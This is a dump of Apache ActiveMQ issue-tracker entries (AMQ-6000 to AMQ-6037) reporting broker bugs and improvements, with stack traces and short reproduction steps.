org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)        at java.lang.Thread.run(Thread.java:595)INFO  VMTransportFactory             - Shutting down VM connectors for broker: localhostINFO  VMTransportFactory             - Shutting down VM connectors for broker: localhostINFO  Service                        - Async error occurred: java.io.EOFException: Cannot write to the stream any more it has already been closedjava.io.EOFException: Cannot write to the stream any more it has already been closed        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.checkClosed(TcpBufferedOutputStream.java:131)        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.write(TcpBufferedOutputStream.java:69)        at java.io.DataOutputStream.writeInt(DataOutputStream.java:180)        at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:169)        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:117)        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:212)        at org.apache.activemq.broker.AbstractConnection.dispatchSync(AbstractConnection.java:517)        at org.apache.activemq.broker.AbstractConnection.dispatchAsync(AbstractConnection.java:535)        at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:142)        at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:54)        at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:50)        at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:365)        at org.apache.activemq.broker.region.Topic.send(Topic.java:247)        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:312)        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)        at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:336)        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)        at java.lang.Thread.run(Thread.java:595)Reverting to "anonymous" clients allows the client to create a new connection, but further persistant connections from the initial clientId cannot be made until the broker is restarted.Please contact via email:  johng@amdswireless.com for additional information, if needed.
issueID:AMQ-6000
type:Bug
changed files:
texts:Pause/resume feature of ActiveMQ not resuming properly
The problem is that, when you resume the message delivery, If there is a message entering the queue: the broker will immediately send the pending messages to the consumer which is totally OK. But if no message enters the queue: the pending messages in the queue will not be sent to the consumers until the expiration checking is performed on the queue (which by default is 30 seconds and can be controlled by the expireMessagesPeriod attribute) and non-expired messages will be sent to the consumers afterwards.Obviously we can change the expireMessagesPeriod to limit this delay, but when you need a milisec precision, performing the expiration check every milisec will not make sense.How is it possible to force the queue to start sending messages immediately after resumption?
issueID:AMQ-6001
type:Improvement
changed files:AmqpReceiver.java
texts:AMQP: Refill sender credit faster to avoid throttling fast producers
We should send back credit a bit faster so that a remote sender that is fast doesn"t have to pause waiting for more credit.
issueID:AMQ-6002
type:Bug
changed files:
texts:MQTT virtual topic strategy doesn&#39;t escape client id properly
If client id contains special characters like ".", the consumer will not receive messages properly
issueID:AMQ-6003
type:Sub-task
changed files:
texts:Upgrade Pax Runner to version 1.8.6
Upgrade Pax Runner to version 1.8.6.I"d like to take care of this.
issueID:AMQ-6004
type:Bug
changed files:TcpTransportServer.java
texts:TcpTransportServer#socketHandlerThread should be intterrupted to stop the socket handler (daemon) thread
I am trying to achieve a clean shutdown of an embedded broker in a web application running in Tomcat. When the web application is shut down, Tomcat is always complaining about a running thread:09:09:55.948 WARN  [o.a.c.loader.WebappClassLoaderBase] [] The web application [xxx] appears to have started a thread named [ActiveMQ Transport Server Thread Handler: tcp://0.0.0.0:12345] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: sun.misc.Unsafe.park(Native Method) java.util.concurrent.locks.LockSupport.parkNanos(Unknown Source) java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(Unknown Source) java.util.concurrent.LinkedBlockingQueue.poll(Unknown Source) org.apache.activemq.transport.tcp.TcpTransportServer$2.run(TcpTransportServer.java:427) java.lang.Thread.run(Unknown Source)I am pretty sure this can be easily fixed by interrupting the socket handler thread, as suggested by Andreas Hartmann in AMQ-3451. Please see attached patch.
issueID:AMQ-6005
type:Bug
changed files:
texts:Slave broker startup corrupts shared PList storage
BackgroundWhen multiple JVMs run AMQ in a master/slave configuration with the broker directory in a shared filesystem location (as is required e.g. for kahaPersistence), and when due to high message volume or slow producers the broker"s memory needs exceed the configured memory usage limit, AMQ will overflow asynchronous messages to a PList store inside the "tmp_storage" subdirectory of said shared broker directory.IssueWe frequently observed this tmpDB store getting corrupted with "stale NFS filehandle" errors for tmpDB.data, tmpDB.redo, and some journal files, all of which suddenly went missing from the tmp_storage folder. This puts the entire broker into a bad state from which it cannot recover. Only restarting the service (which causes a broker slave to take over and loses the yet-undelivered messages) gets a working state back.SymptomsStack trace:...Caused by: java.io.IOException: Stale file handle at java.io.RandomAccessFile.readBytes0(Native Method) at java.io.RandomAccessFile.readBytes(RandomAccessFile.java:350) at java.io.RandomAccessFile.read(RandomAccessFile.java:385) at java.io.RandomAccessFile.readFully(RandomAccessFile.java:444) at java.io.RandomAccessFile.readFully(RandomAccessFile.java:424) at org.apache.kahadb.page.PageFile.readPage(PageFile.java:876) at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:446) at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:437) at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:434) at org.apache.kahadb.page.Transaction.load(Transaction.java:410) at org.apache.kahadb.page.Transaction.load(Transaction.java:367) at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:306) at org.apache.kahadb.index.ListIndex.getHead(ListIndex.java:99) at org.apache.kahadb.index.ListIndex.iterator(ListIndex.java:284) at org.apache.activemq.store.kahadb.plist.PList$PListIterator.<init>(PList.java:199) at org.apache.activemq.store.kahadb.plist.PList.iterator(PList.java:189) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.<init>(FilePendingMessageCursor.java:496)CauseDuring BrokerThread startup, the BrokerService.startPersistenceAdapter() method is called, which  via doStartPersistenceAdapter() and getProducerSystemUsage() invokes getSystemUsage(), that calls getTempDataStore(), and that method summarily cleans out the existing contents of the tmp_storage directory.All of this happens before the broker lock is obtained in the PersistenceAdapter.start() method at the end of doStartPersistenceAdapter().So a JVM that doesn"t get to be the broker (because there already is one) and runs in slave mode (waiting to obtain the broker lock) interferes with and corrupts the running broker"s tmp_storage and thus breaks the broker. That"s a critical bug. The slave has no business starting up the persistence adapter and cleaning out data as it hasn"t gotten the lock yet, so isn"t allowed to do any work, period. WorkaroundAs workaround, an unshared local directory needs to be specified as tempDirectory for the broker, even if the main broker directory is shared. Also, since broker startup will clear the tmp_storage out anyway, there really is no advantage to having this in a shared location - since the next broker that starts up after a broker failure will never re-use that data anyway.
issueID:AMQ-6009
type:Sub-task
changed files:
texts:Update Qpid JMS client to the latest release
Update to the latest Qpid JMS client to ensure we maintain compatibility with the JMS -> AMQP mapping.
issueID:AMQ-6010
type:Bug
changed files:
texts:AMQP SSL Transport "leaking" currentTransportCounts
When using the AMQP SSL transport the currentTransportCount (variable that tracks connection count in TcpTransportServer.java) can "leak" when the SSL connection is aborted during handshake. In this case the TcpTransportServer class the currentTransportCount is incremented in handleSocket but never decremented in stopped. This eventually leads to ExceededMaximumConnectionsException being thrown from handleSocket. The SSL connection is aborted during handshake if needClientAuth is configured on the transport and a client with an invalid certificate tries to connect.Reproduction1. Enable the AMQP SSL transport: <transportConnector name="amqp+ssl" uri="amqp+ssl://0.0.0.0:5671?needClientAuth=true&maximumConnections=10"/>2. Try to connect with no/invalid client certificate: openssl s_client -connect localhost:56713. After 10 attempts ActiveMQ logs will start showing ExceededMaximumConnectionsException exceptions.BugDuring the SSL handshake phase the protocol converter in the AMQP transport is set to the AMQPProtocolDiscriminator which silently swallows exceptions:public void onAMQPException(IOException error) {}Which in turn cause the normal stop sequence (via asyncStop) to be skipped.FixChange the AMQPProtocolDiscriminator to handle the error instead of swallow it:public void onAMQPException(IOException error) {    transport.sendToActiveMQ(error);}
issueID:AMQ-6013
type:Bug
changed files:
texts:Restrict classes that can be serialized in ObjectMessages
At some points we do (de)serialization of JMS Object messages inside the broker (HTTP, Stomp, Web Console, ...). We need to restrict classes that can be serialized in this way.
issueID:AMQ-6014
type:Bug
changed files:
texts:Offline Durable Topic Subscription exceeds memory limits
To reproduce:1) Start two durable subscriptions using the openwire swissarmy examples:ant consumer -Dtopic=true -Ddurable=true -Dsubject=test -Duser=admin -Dpassword=admin -Dmax 500000ant consumer -Dtopic=true -Ddurable=true -Dsubject=test -Duser=admin -Dpassword=admin -DclientId=c22) Start a producer using the following command:ant producer -Dtopic=true -Ddurable=true -Dsubject=test -Duser=admin -Dpassword=admin -Dmax=5000003) Kill one of the durable topic subscribers and let the test run4) the broker will go OOMThe cache for the offline durable sub is not recording is cached messages against system memory usage as it should. Hence the limits are not hit.
issueID:AMQ-6015
type:Improvement
changed files:
texts:AMQP: Report more meaningful error conditions when an incoming send fails
When an AMQP client send a message to the broker we currently send back a generic failure error condition where some more meaningful values can be generated for security or resource allocation errors.
issueID:AMQ-6016
type:Bug
changed files:ConsumerInfo.java
CachedMessageGroupMap.java
Queue.java
texts:java.lang.IllegalArgumentException: Comparison method violates its general contract!
The message group balancing is based on state in the consumer that can be shared across destinations in error. Under load this can lead to:2015-04-13 10:24:20,034 | WARN  | IO Worker 308792 | Service                          | ivemq.broker.TransportConnection  312 | 121 - org.apache.activemq.activemq-osgi - 5.9.0 | Async error occurred: java.lang.IllegalArgumentException: Comparison method violates its general contract! at java.util.TimSort.mergeHi(TimSort.java:868)[:1.7.0_65] at java.util.TimSort.mergeAt(TimSort.java:485)[:1.7.0_65] at java.util.TimSort.mergeCollapse(TimSort.java:410)[:1.7.0_65] at java.util.TimSort.sort(TimSort.java:214)[:1.7.0_65] at java.util.TimSort.sort(TimSort.java:173)[:1.7.0_65] at java.util.Arrays.sort(Arrays.java:659)[:1.7.0_65] at java.util.Collections.sort(Collections.java:217)[:1.7.0_65] at org.apache.activemq.broker.region.Queue.addToConsumerList(Queue.java:2131)[121:org.apache.activemq.activemq-osgi:5.9.0] at org.apache.activemq.broker.region.Queue.doActualDispatch(Queue.java:2067)[121:org.apache.activemq.activemq-osgi:5.9.0] at org.apache.activemq.broker.region.Queue.doDispatch(Queue.java:1972)[121:org.apache.activemq.activemq-osgi:5.9.0] at org.apache.activemq.broker.region.Queue.removeSubscription(Queue.java:587)[121:org.apache.activemq.activemq-osgi:5.9.0] at org.apache.activemq.broker.region.DestinationFilter.removeSubscription(DestinationFilter.java:127)[121:org.apache.activemq.activemq-osgi:5.9.0] at ...... at java.lang.Thread.run(Thread.java:745)[:1.7.0_65]
issueID:AMQ-6017
type:Bug
changed files:NIOTransport.java
texts:Make ioBufferSize configurable for nio transport
Buffer size can be configured for tcp transport with transport.ioBufferSize=xxx property. In nio case it"s hard coded to 8k (default for tcp case as well). We need to be bale to tune this in nio case as well.
issueID:AMQ-6020
type:Bug
changed files:
texts:Webconsole does not work in karaf
Compile from masterfeature:repo-add activemq 5.13-SNAPSHOTfeature:install activemq-broker activemq-web-console The web console bundle is active and web:list shows:ID | State       | Web-State   | Level | Web-ContextPath | Name-------------------------------------------------------------------------------------------------62 | Active      | Deployed    | 80    | /activemqweb    | activemq-web-console (5.13.0.SNAPSHOT)When I go to http://localhost:8181/activemqweb/I get unable to connect. So the port is not active. Maybe pax web does not activate jetty because of the exception below.In the log I see this exception:ClassNotFoundException: javax.xml.transform.stax.StAXSourceFull trace here:2015-10-23 10:48:20,428 | ERROR | pool-45-thread-1 | DispatcherServlet                | 62 - org.apache.activemq.activemq-web-console - 5.13.0.SNAPSHOT | Context initialization failedorg.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter": Instantiation of bean failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate &#91;org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter&#93;: Constructor threw exception; nested exception is java.lang.NoClassDefFoundError: javax/xml/transform/stax/StAXSource at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateBean(AbstractAutowireCapableBeanFactory.java:1099)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1044)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:504)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:476)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:291)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.DispatcherServlet.createDefaultStrategy(DispatcherServlet.java:849)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.DispatcherServlet.getDefaultStrategies(DispatcherServlet.java:818)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.DispatcherServlet.initHandlerAdapters(DispatcherServlet.java:626)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.DispatcherServlet.initStrategies(DispatcherServlet.java:483)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.DispatcherServlet.onRefresh(DispatcherServlet.java:471)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.FrameworkServlet.onApplicationEvent(FrameworkServlet.java:802)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.FrameworkServlet$ContextRefreshListener.onApplicationEvent(FrameworkServlet.java:1118)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.FrameworkServlet$ContextRefreshListener.onApplicationEvent(FrameworkServlet.java:1114)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.context.event.GenericApplicationListenerAdapter.onApplicationEvent(GenericApplicationListenerAdapter.java:52)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.context.event.SourceFilteringListener.onApplicationEventInternal(SourceFilteringListener.java:100)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.context.event.SourceFilteringListener.onApplicationEvent(SourceFilteringListener.java:69)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:151)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:128)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:331)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:775)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:483)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.FrameworkServlet.configureAndRefreshWebApplicationContext(FrameworkServlet.java:664)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:630)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:678)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.FrameworkServlet.initWebApplicationContext(FrameworkServlet.java:549)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:490)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.HttpServletBean.init(HttpServletBean.java:136)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at javax.servlet.GenericServlet.init(GenericServlet.java:244)&#91;57:javax.servlet-api:3.1.0&#93; at org.eclipse.jetty.servlet.ServletHolder.initServlet(ServletHolder.java:612)&#91;107:org.eclipse.jetty.servlet:9.2.10.v20150310&#93; at org.eclipse.jetty.servlet.ServletHolder.initialize(ServletHolder.java:395)&#91;107:org.eclipse.jetty.servlet:9.2.10.v20150310&#93; at org.eclipse.jetty.servlet.ServletHandler.initialize(ServletHandler.java:871)&#91;107:org.eclipse.jetty.servlet:9.2.10.v20150310&#93; at org.eclipse.jetty.servlet.ServletContextHandler.startContext(ServletContextHandler.java:298)&#91;107:org.eclipse.jetty.servlet:9.2.10.v20150310&#93; at org.eclipse.jetty.server.handler.ContextHandler.doStart(ContextHandler.java:741)&#91;106:org.eclipse.jetty.server:9.2.10.v20150310&#93; at org.ops4j.pax.web.service.jetty.internal.HttpServiceContext.doStart(HttpServiceContext.java:245)&#91;126:org.ops4j.pax.web.pax-web-jetty:4.2.2&#93; at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:68)&#91;109:org.eclipse.jetty.util:9.2.10.v20150310&#93; at org.ops4j.pax.web.service.jetty.internal.JettyServerImpl$1.start(JettyServerImpl.java:258)&#91;126:org.ops4j.pax.web.pax-web-jetty:4.2.2&#93; at org.ops4j.pax.web.service.internal.HttpServiceStarted.end(HttpServiceStarted.java:1047)&#91;128:org.ops4j.pax.web.pax-web-runtime:4.2.2&#93; at org.ops4j.pax.web.service.internal.HttpServiceProxy.end(HttpServiceProxy.java:413)&#91;128:org.ops4j.pax.web.pax-web-runtime:4.2.2&#93; at org.ops4j.pax.web.extender.war.internal.RegisterWebAppVisitorWC.end(RegisterWebAppVisitorWC.java:380)&#91;124:org.ops4j.pax.web.pax-web-extender-war:4.2.2&#93; at org.ops4j.pax.web.extender.war.internal.model.WebApp.accept(WebApp.java:692)&#91;124:org.ops4j.pax.web.pax-web-extender-war:4.2.2&#93; at org.ops4j.pax.web.extender.war.internal.WebAppPublisher$WebAppDependencyListener.register(WebAppPublisher.java:237)&#91;124:org.ops4j.pax.web.pax-web-extender-war:4.2.2&#93; at org.ops4j.pax.web.extender.war.internal.WebAppPublisher$WebAppDependencyListener.addingService(WebAppPublisher.java:182)&#91;124:org.ops4j.pax.web.pax-web-extender-war:4.2.2&#93; at org.ops4j.pax.web.extender.war.internal.WebAppPublisher$WebAppDependencyListener.addingService(WebAppPublisher.java:135)&#91;124:org.ops4j.pax.web.pax-web-extender-war:4.2.2&#93; at org.osgi.util.tracker.ServiceTracker$Tracked.customizerAdding(ServiceTracker.java:941)&#91;org.osgi.core-6.0.0.jar:&#93; at org.osgi.util.tracker.ServiceTracker$Tracked.customizerAdding(ServiceTracker.java:870)&#91;org.osgi.core-6.0.0.jar:&#93; at org.osgi.util.tracker.AbstractTracked.trackAdding(AbstractTracked.java:256)&#91;org.osgi.core-6.0.0.jar:&#93; at org.osgi.util.tracker.AbstractTracked.trackInitial(AbstractTracked.java:183)&#91;org.osgi.core-6.0.0.jar:&#93; at org.osgi.util.tracker.ServiceTracker.open(ServiceTracker.java:318)&#91;org.osgi.core-6.0.0.jar:&#93; at org.osgi.util.tracker.ServiceTracker.open(ServiceTracker.java:261)&#91;org.osgi.core-6.0.0.jar:&#93; at org.ops4j.pax.web.extender.war.internal.WebAppPublisher.publish(WebAppPublisher.java:101)&#91;124:org.ops4j.pax.web.pax-web-extender-war:4.2.2&#93; at org.ops4j.pax.web.extender.war.internal.WebObserver.deploy(WebObserver.java:219)&#91;124:org.ops4j.pax.web.pax-web-extender-war:4.2.2&#93; at org.ops4j.pax.web.extender.war.internal.WebObserver$1.doStart(WebObserver.java:179)&#91;124:org.ops4j.pax.web.pax-web-extender-war:4.2.2&#93; at org.ops4j.pax.web.extender.war.internal.extender.SimpleExtension.start(SimpleExtension.java:59)&#91;124:org.ops4j.pax.web.pax-web-extender-war:4.2.2&#93; at org.ops4j.pax.web.extender.war.internal.extender.AbstractExtender$1.run(AbstractExtender.java:280)&#91;124:org.ops4j.pax.web.pax-web-extender-war:4.2.2&#93; at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)&#91;:1.8.0_60&#93; at java.util.concurrent.FutureTask.run(FutureTask.java:266)&#91;:1.8.0_60&#93; at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180)&#91;:1.8.0_60&#93; at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293)&#91;:1.8.0_60&#93; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)&#91;:1.8.0_60&#93; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)&#91;:1.8.0_60&#93; at java.lang.Thread.run(Thread.java:745)&#91;:1.8.0_60&#93;Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate &#91;org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter&#93;: Constructor threw exception; nested exception is java.lang.NoClassDefFoundError: javax/xml/transform/stax/StAXSource at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:163)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:89)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateBean(AbstractAutowireCapableBeanFactory.java:1092)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; ... 60 moreCaused by: java.lang.NoClassDefFoundError: javax/xml/transform/stax/StAXSource at org.springframework.http.converter.xml.SourceHttpMessageConverter.<clinit>(SourceHttpMessageConverter.java:74)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.<init>(AnnotationMethodHandlerAdapter.java:203)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)&#91;:1.8.0_60&#93; at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)&#91;:1.8.0_60&#93; at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)&#91;:1.8.0_60&#93; at java.lang.reflect.Constructor.newInstance(Constructor.java:422)&#91;:1.8.0_60&#93; at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:147)&#91;62:org.apache.activemq.activemq-web-console:5.13.0.SNAPSHOT&#93; ... 62 moreCaused by: java.lang.ClassNotFoundException: javax.xml.transform.stax.StAXSource not found by org.apache.activemq.activemq-web-console &#91;62&#93; at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1558)&#91;org.apache.felix.framework-5.2.0.jar:&#93; at org.apache.felix.framework.BundleWiringImpl.access$400(BundleWiringImpl.java:79)&#91;org.apache.felix.framework-5.2.0.jar:&#93; at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:1998) at java.lang.ClassLoader.loadClass(ClassLoader.java:357)&#91;:1.8.0_60&#93; ... 69 more
issueID:AMQ-6021
type:Bug
changed files:
texts:mqtt+nio+ssl don&#39;t work with certificate authentication properly
This is very similar to https://issues.apache.org/jira/browse/AMQ-4133 Stomp issue.
issueID:AMQ-6027
type:New Feature
changed files:
texts:Dynamic network demand should support Virtual Destination consumers
Currently the broker supports the notion of dynamicallyIncludedDestinations, where messages will only be sent across a network of brokers if there is a consumer that exists on that destination.  This is good because it reduces the amount of traffic if there are no consumers, however it doesn"t take into account any virtual/composite destinations that might exist or the consumers on those virtual/composite destinations.  I"d like to be able to create demand and have messages flow based on Virtual Destination creation, either on start up or dynamically by the runtime configuration plugins, or by new consumers on a Virtual Destination.So for example, if there are two brokers networked and on Broker A messages are published to a topic, normally those messages only get passed to Broker B if there is a consumer on that topic when setting dynamicallyIncludedDestinations to true.  I want to have an option so that a virtual destination setup on Broker B that forwards that topic to a queue will trigger messages to start flowing from Broker A to Broker B.  Messages could start flowing either simply based on the existence of the Virtual Destination (likely used for the case of a topic forwarding to a queue, so messages accumulate on the queue) or based on there being a consumer on the forwarded destination (likely used for the case of a queue forwarding to a topic). I"ve done some prototyping work here already and my plan is to keep track of Virtual Destination consumers (configurable by the existence of the virtual destination or by the fact that a real consumer exists on it) and to create a new advisory topic where the broker can publish consumer advisories to.  The prefix could be called something like:ActiveMQ.Advisory.VirtualDestination.Consumer.TopicActiveMQ.Advisory.VirtualDestination.Consumer.QueueAdvisory messages can be sent either when virtual destinations are created/destroyed (kind of a dummy consumer) or when a real consumer comes online for a virtual destination.  Then a remote broker could optionally listen for those advisory messages and create or destroy a DemandSubscription, just like is currently done for normal consumers.The default behavior out of the box would be to keep this behavior turned off, but it could optionally be turned on through configuration.
issueID:AMQ-6029
type:Bug
changed files:
texts:wss transport don&#39;t work with certificate authentication properly
As it was the case with some other transports (https://issues.apache.org/jira/browse/AMQ-6021), peer certificates are not properly propagated down the stack.
issueID:AMQ-6030
type:Improvement
changed files:
texts:STOMP: Add support for produce and consume from composite destiantions
Parse the destination string and build a proper ActiveMQDestination when the incoming SEND or SUBSCRIBE uses a composite style destination:/queue/destA,/queue/destB
issueID:AMQ-6031
type:Bug
changed files:AmqpConnection.java
texts:AMQP: use System.nanoTime() when deriving time to tick the transport with for idle-timeout handling
The sending of empty AMQP heartbeating frames to satisfy the remote peers advertised idle-timeout, and closure of the connection if no frames are received from a peer to satisfy our local idle-timeout, are handled by protons Transport#tick() method. This method takes the current time as an argument and determines what (if any) actions should be undertaken now, then returns the next point at which further processing is required. In order to faciliate this the last "current time" the method was called with is saved between calls. As with QPIDJMS-136, we should update our usage of the proton Transport#tick() method to use a monotonic time, derived from System.nanoTime(), rather than a wall time from System.currentTimeMillis(), so that clock changes between these points dont lead to incorrect behaviour (e.g not sending a required frame, or thinking a frame hasnt been received that should have been).
issueID:AMQ-6032
type:Bug
changed files:
texts:Properties on scheduled messages can get lost on dispatch
In some cases such as when the reduceMemoryFootprint option is enabled the messages fired from the job scheduler can lose their message properties due to both the marshaled and unmarshaled properties getting cleared.  The SchedulerBroker needs to repack the message properties after its updates to ensure they don"t get dropped.
issueID:AMQ-6033
type:Bug
changed files:
texts:mkahaDB,shared-file-locker - broker not shutting down when it loses the lock
BrokerService member shadows lockable service support member var leading to keepalive check failing to shutdown broker.
issueID:AMQ-6035
type:Improvement
changed files:
texts:Add an option to apply Virtual Destination changes immediately
Normally when using the JavaRuntimeConfigurationBroker to apply updates to virtual destinations, the changes don"t apply until a new connection or destination is added.  This usually works but sometimes it would be useful to have the option to apply the changes immediately so existing destinations are changed without having to wait for a new destination or connection.
issueID:AMQ-6036
type:Bug
changed files:
texts:Too trivial check in SubQueueSelectorCacheBroker.hasWildcards
VirtualSelectorCache plugin cannot be reliably used when message selectors use e. g. literals with underscore like notificationType = "NOTIFY_DELETE".Full evaluation would need to walk the parsed selector, however the method should at least check for presence of LIKE case-insensitevely to return less false positives.
issueID:AMQ-6037
type:New Feature
changed files:
texts:AMQP: Add support for sending scheduled message using message annotations
